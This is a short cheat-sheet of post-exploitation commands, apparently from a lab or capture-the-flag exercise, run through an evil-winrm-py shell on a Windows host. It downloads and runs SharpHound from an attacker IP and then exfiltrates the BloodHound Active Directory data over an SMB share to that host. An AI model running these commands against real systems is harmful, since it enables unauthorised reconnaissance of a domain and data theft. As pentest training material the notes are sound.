#! /bin/bash

# Enumerate Windows Host: run native Windows commands or PowerShell expressions

# Folder PATH listing
evil-winrm-py PS C:\> tree /f .

# Move around to find Flask app....

# OS information
evil-winrm-py PS C:\> systeminfo
evil-winrm-py PS C:\> Get-ComputerInfo

# Active Directory Enum

# Grab and run SharpHound
evil-winrm-py PS C:\programdata> wget http://10.10.14.61/SharpHound.exe -outfile sh.exe                                                
evil-winrm-py PS C:\programdata> .\sh.exe -c all
evil-winrm-py PS C:\programdata> ls 20260408212935_BloodHound.zip

# Create SMB server on pentest host and exfil BloodHound data 
smbserver.py share . -smb2support -username oxdf -password oxdf

# Exfil
evil-winrm-py PS C:\programdata> net use \\10.10.14.61\share /u:oxdf oxdf
evil-winrm-py PS C:\programdata> copy 20260408212935_BloodHound.zip \\10.10.14.61\share\

# Capture functional levels which BloodHound does not
# Domain/Forest Functional Level (DFL/FFL): requires every DC in that domain to run an OS version equal to or newer than the functional level.
evil-winrm-py PS C:\> Get-ADDomain | Select Name, DomainMode
evil-winrm-py PS C:\> Get-ADForest | Select Name, ForestMode
